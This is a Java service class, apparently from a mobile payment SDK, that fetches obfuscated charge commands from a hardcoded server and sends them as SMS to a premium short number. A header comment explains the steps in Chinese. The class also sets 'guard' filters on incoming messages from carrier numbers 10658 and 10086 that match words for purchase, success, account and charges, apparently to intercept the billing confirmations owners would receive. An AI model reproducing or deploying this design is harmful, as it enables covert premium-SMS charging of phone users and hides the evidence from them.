package com.jxt.pay.appclient.service.dynamic.net;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;

import org.apache.log4j.Logger;

import sun.misc.BASE64Decoder;

import com.jxt.pay.appclient.service.dynamic.pojo.Error;
import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Repeat;
import com.jxt.pay.appclient.service.dynamic.pojo.Sets;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;
import com.jxt.pay.appclient.utils.SingleXmlUtil;
import com.jxt.pay.appclient.utils.StringUtils;
import com.jxt.pay.handler.MobileInfoHandler;
import com.jxt.pay.helper.BlackMobileHelper;
import com.jxt.pay.pojo.MobileInfo;

/**掌智通普林都DD斗地主
 * 第一步是手机发送一个登录指令
BUB@T|@W  NAA8uk87@hWg55tc80@66388999@2888468985@8@092692588882356@40955@*************到10658422
这2段13位的*符号是要随机生成13位数字构成。例如生成登录指令如下：
BUB@T|@W  NAA8uk87@hWg55tc80@66388999@2888468985@8@092692588882356@40955@0913570982183发送到10658422  随机13位数：0913570982183

第二步是wap登录取动态的扣费指令；
http://118.26.135.91:8080/cp/ob?randomCode=0913570982183&cpCodeInfoId=100&imei=&cpParam=SDKC000000000&cpID=33&format=xml  这条URL里面要同时添加随机13位值randomCode，数值和登录指令的随机13位数字一致。randomCode=0913570982183
即可得到下发内容为：<?xml version="1.0" encoding="UTF-8"?><info><linkid>ZrM6w5RBEbDhRDsejJU3UlgrmIV9EIbz<nkid><infoCode>0</infoCode><smsInfo>::pHRp[z:R2:]V[::3pRH^[:2fL:SH|To)>$::::9:eP::3<XHM::5:/Vz3]?:\6:::X:zY\W)uV!Mz11sT:Jc:r:2=::V[[>2Bg+~fYV2Ox.+|njf;mV~Do?}^NWETQ,HU^~d[</smsInfo><mobile>13570982183</mobile></info>

其中<smsInfo>的值就是动态扣费指令。
取扣费指令：::pHRp[z:R2:]V[::3pRH^[:2fL:SH|To)>$::::9:eP::3<XHM::5:/Vz3]?:\6:::X:zY\W)uV!Mz11sT:Jc:r:2=::V[[>2Bg+~fYV2Ox.+|njf;mV~Do?}^NWETQ,HU^~d[发送到1065889923 
完成扣费。
 * @author leoliu
 *
 */
public class ZztWyDynamicService implements IDynamicService{
	private static Logger logger = Logger.getLogger(ZztWyDynamicService.class);
	
	private static final String TYPE = "zztWy";
	
	private static final String URLPARAM = "randomCode={randomCode}&cpCodeInfoId={cpCodeInfoId}&imei={imei}&cpParam=151{random}&cpID={cpID}&format=xml";

	private static final String SMSDEST1 = "1065889923";
	private static final String DEFAULTCPCODEINFOID = "419";
	private static final String DEFAULTCPID = "26";
	
	private static final Guard guard0 = new Guard("10658","成功|购买",2880,"1",0);
	private static final Guard guard1 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard2 = new Guard("10658","",960,null,1);
	private static final Guard guard3 = new Guard("10086","",960,null,1);
	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	private int timeOut = 60;
	
	
	@Override
	public String getType() {
		return TYPE;
	}

	//记录重复请求
	private Map<String, Long> tryMap = new HashMap<String, Long>();
			
	public String dynamic(Map<String,String> map){
		
		String xml = null;
		String url = map.get("url");
		
		String randomCode = map.get("randomCode");
		
		if(url != null && url.length() > 0){
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(randomCode);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(randomCode,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(randomCode);
					return DynamicUtils.parseError("599");
				}
			}
			
			String param = URLPARAM.replace("{randomCode}", map.get("randomCode"));
			param = param.replace("{imei}", map.get("imei"));
			
			String cpCodeInfoId = map.get("cpCodeInfoId");
			if(cpCodeInfoId == null || cpCodeInfoId.length() == 0){
				cpCodeInfoId = DEFAULTCPCODEINFOID;
			}
			param = param.replace("{cpCodeInfoId}", cpCodeInfoId);
			
			String cpID = map.get("cpID");
			if(cpID == null || cpID.length() == 0){
				cpID = DEFAULTCPID;
			}
			param = param.replace("{cpID}", cpID);
			
			param = param.replace("{random}",StringUtils.getRandom(10));
			
			String responseXml = GetData.getData(url+"?"+param);
			
			xml = parseXml(map,responseXml);
			
			if(xml == null || xml.length() == 0){
				xml = DynamicUtils.parseWait(10,map);
			}else{
				tryMap.remove(randomCode);
			}
		}else{
			tryMap.remove(randomCode);
		}
		
		return xml;
	}
	
	private String parseXml(Map<String,String> map,String responseXml){
		
//		logger.info("zztWy : "+responseXml);
		
		String smsContent = SingleXmlUtil.getNodeValue(responseXml, "smsInfo");
		
		if(smsContent == null || smsContent.length() == 0){
			return DynamicUtils.parseWait(map);
		}else{
			
			tryMap.remove(map.get("randomCode"));
			
			{
				List<Sms> smsList = new ArrayList<Sms>();
				
				Sms sms = new Sms();
				
				sms.setSmsContent(smsContent);
				sms.setSmsDest(SMSDEST1);
				sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
				
				smsList.add(sms);
				
				Sms guardSms = new Sms();
							
				List<Guard> guardList = new ArrayList<Guard>();
				
				guardList.add(guard0);
				guardList.add(guard1);
						
				guardList.add(guard2);
				guardList.add(guard3);
				
				guardSms.setGuardList(guardList);
				
				smsList.add(0, guardSms);
					
				return XstreamHelper.toXml(smsList);
			}
		}
	}
	
	public void setTimeOut(int timeOut) {
		this.timeOut = timeOut;
	}
	
	public static void main(String[] args){
		
		ZztWyDynamicService service = new ZztWyDynamicService();
		
		Map<String, String> map = new HashMap<String, String>();
		 
		map.put("randomCode","3308728667619");
		map.put("url","http://118.26.135.91:8080/cp/ob");
		map.put("mobileId","2892");
		map.put("imei","869460011612203");
		map.put("cpCodeInfoId","2084");
		map.put("cpID","26");
		
		System.out.println(service.dynamic(map));
		
//		String s = "::pHRp[z:f2H{3[::3p>:CH:p+i:vp|To)>$::::9:eP::3<:Xk::5:^2:?:::\\6:::X:zYI|@(XDQQ11sT:Jc:r:2=::VHjR:3\\V\\V@Q2g9]g.zgu!Fwos{.0^dE{2 @WGzEd[";
//		
//		s = "OjpwSFJwW3o6ZjJIezNbOjozcD46Q0g6cCtpOnZwfFRvKT4kOjo6Ojk6ZVA6OjM8OlhrOjo1Ol4yOj86OjpcNjo6Olg6elk9empSXm80fjExc1Q6SmM6cjoyPTo6VkhqUjozM1wzUVNIMnBSbFZELHAoSG0wRURlNlg1V3pAM2xyRGFISGRb";
//		
//		try {
//			System.out.println(new String(decoder.decodeBuffer(s),"utf-8"));
//		} catch (UnsupportedEncodingException e) {
//			// TODO Auto-generated catch block
//			e.printStackTrace();
//		} catch (IOException e) {
//			e.printStackTrace();
//		}
	}
}
